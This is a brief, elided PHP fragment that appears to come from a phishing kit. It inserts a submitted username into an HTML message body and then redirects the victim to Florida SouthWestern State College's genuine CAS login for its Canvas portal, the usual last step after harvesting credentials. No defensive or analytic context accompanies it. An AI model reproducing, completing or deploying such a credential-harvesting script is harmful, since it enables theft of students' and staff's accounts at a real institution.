...
$message .= '<p style="color:#000066;font-size:18px;">User Name : '. $_POST['username'] . ' </p>';
...
header("Location: https://cas.fsw.edu/cas-web/login?service=https%3A%2F%2Ffsw.instructure.com%2Flogin%2Fcas");
?>